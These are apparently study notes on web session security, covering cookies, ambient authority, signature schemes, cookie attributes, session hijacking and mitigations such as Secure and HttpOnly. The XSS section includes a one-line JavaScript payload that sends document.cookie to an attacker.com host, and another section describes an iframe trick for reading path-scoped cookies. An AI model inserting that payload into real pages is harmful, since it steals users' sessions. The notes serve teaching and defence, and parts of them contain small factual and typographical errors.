## Session Attacks


### Sessions

Cookies are used by the server to implement sessions.

Tha main goal here is to keep a set of data related to a user's current browsing session.

Sessions want to keep some set of data about the user across a series of requests as http is stateless and use the cookies
with it's key-values.

Eg:
- Logins
- Shopping Carts
- User Tracking

A Sample Operation of Sessions:

```bash
First HTTP request:

POST/login HTTP/1.1
Host: example.com

username=alice&password=password


HTTP response:
HTTP/1.1 200 OK
Set-Cookie: username=alice
Date: Tue, 24 Sep 2019 20:30:00 GMT

<!DOCTYPE html ...


All future HTTP requests:

GET/page.html HTTP/1.1
Host: example.com
Cookie: username=alice;
```

### Ambient Authority 
Ambient authority is a security concept whih allows you to regulate who can do what on the site

>A subject, such as a computer program, is said to be using ambient authority if it only needs to specify the names of the involved object(s) and the operation to be performed on them in order for a permitted action to succeed.

Ambient authority monitors and is incharge of *access control* where it can regulate who can view resources or take actions.

An alternative to ambient authority is explicit authorization which is valid only for a specific action and can result in consequences of it's own where for an example for each action performed by the user you 
authenticate and login to perform the action and that could be tedious.

The major types of ambient authority on the web involve:
- Cookies
    - The most common,versatile method
- IP checking
    - used by orgs for access to resources
- Built-in HTTP authentication(old)
    - Introduced with RFC 7617[^rfc] where the user-credentials are transmitted as user-id/password-pairs encoded in Base64.
- Client Certificates[^cc]
    - rarely used 


### Signature Schemes

To make sure cookies are not modified we can sign the cookie where signature schemes comes into place.

A signature scheme consists a triple of algorithms(G,S,V):

`G` - Generator 

`S` - Signer

`V` - Verifier


#### G() 
>G() -> (pk.sk)

When the Generator fn. is called it generates a public,private key whih is used further.



#### S()
>S() -> (sk,x) -> t

when S is called is used to sign the value 

It uses a secret key and a random string (x) to output a tag (t),a random str with useful properties where you can pass the tag along to verify the generated cookie is real or modified using the S fn.


#### V()
>V() -> (pk,x,t) -> accept|reject

V is called to verify:

We use the pk,x and the tag which is processed by the server and results with a boolean result after checking for the validity of tag t for given input x

#### Properties:
- Correctness property
- Security property

The main purpose of signature schemes is it's property of correctness.
Security property is the opposite of correcteness property and
mainly ensures when we pass a garbage value to verify and the result should be false to make it secure,keeping the time to decipher long and the probability to crack hard.



In a scenario where we have a client and the server, where the server generates the pk,sk using the G().

The client goes to login ,the server then validates it and then creates the tag using the username as the random string to respond back to the client along with a unique tag header which is generated by the server.

Further on,the client browser now sends the cookies of username and the tag along with it's request to the server where the server then verifies it using the V() to make sure the username is not tampered with or modified.
After it is verified,we can process the information and repeat the cookies so as to use the service.



### History of Cookies

- Implemented in 1994 in Netscape and described in a four-page draft
- Had no spec for 17 years
- Attempts were made in 1997 and 2000 to spec but had incompatible  changes thus were not successful
- Finally in 2011 efforts succeeded and RF6265 was made.
- Cookies have a very Ad-hoc design and have led to interesting issues.

### Cookie Attributes

`Expires` - Allows specific expiration date.If no date is specified,then lasts for session.
Allows for expiring cookies and delete automatically  on end of session for the browser.

Session Restoration is possible by browsers bringing back sessions and their cookies back.

`Path` - Scope the "Cookie" header to a particula request path prefix.
Scope cookies to be sent only at certain instances and cases.

Eg: Path=/docs will match /docs and /docs/web

Path is not totally secure for improving security

- Cannot be used for security

`Domain`- Allows the cookie to be scoped to a domain broader than the domain that returned the Set-Cookie header.

E.g: login.stanford.edu could set a cookie for stanford.edu


To attach cookie attributes add them to the set-cookie tagged along.

### Accessing Cookies from JS

```javascript
document.cookie = 'name=shagun'

document.cookie = 'favoriteFood=Cookies; Path=/'document.cookie

// name=Feross; favoriteFood=Cookies;

document.cookie = 'name=; Expires=Thu, 01 Jan 1970 00:00:00 GMT'

document.cookie
// favoriteFood=Cookies;
```

Though you can create cookies from JS there is no object to delete cookies and you have to regex to later delete a cookie from JS,though you have libs that help
you do all this seamlessly but not js itself.

### Session Hijacking

- Sending cookies over unencrypted HTTP is a very bad idea
- If anyone sees the cookie, they can use it to hijack the user's session
- Attacker sends victim's cookie as if it was their own
-  Server will be fooled

Impersonate and MITM allows for it and have access to the hijack the session.

Client sents a HTTP req with session id cookie where the id can be accessed by the attacker who can use the sesion id to then use it for 
impersonation with your session and attack you account/access your details.

### Mitigation Session hijacks

You can make sure that the cookie is never set in an unencrypted network using the Secure tag in cookies.

Use Secure cookie attribute to prevent cookie from being sent over unencrypted HTTP connections

```javascript
Set-Cookie: key=value; Secure
```

Even better: Use HTTPS for entire website not for the login page itself.


### Session hijacking via Cross Site Scripting (XSS)

>What if website is vulnerable to XSS?
- Attacker can insert their code into the webpage
- At this point, they can easily exfiltrate the user's cookie

kicking off request using http where you inject your code using a Image() or any other for that matter.

Exfilterate user cookie and use for attacking and stealing sessions.


```javascript
new Image().src ='https://attacker.com/steal?cookie=' + document.cookie
```

### Protect cookies from XSS
- Use HttpOnly cookie attribute to prevent cookie from being read from JavaScript

```js
Set-Cookie: key=value; Secure; HttpOnly
```

To protect from session hijacking from XSS you can make it so that the cookie cannot be read from JS.
document.cookie doesn't work anymore for the page.


### Cookie Path Bypass

Allows for iframe to access the cookie cross-site.

Cookie path is initially used to only use/send cookies for particular url paths.

- Do not use Path for security
- Path does not protect against unauthorized reading of the cookie from a different path on the same origin
- Can be bypassed using an `<iframe>` with the path of the cookie
- Then, read iframe.contentDocument.cookie
- This is allowed by Same Origin Policy
- Therefore, only use Path as a performance optimization


### Further Reading

Ambient Authority:https://en.wikipedia.org/wiki/Ambient_authority

[^rfc]:https://tooils.ietf.org/html/rfc7617

[^cc]:https://tools.ietf.org/html/rfc5246#section-7.4.4
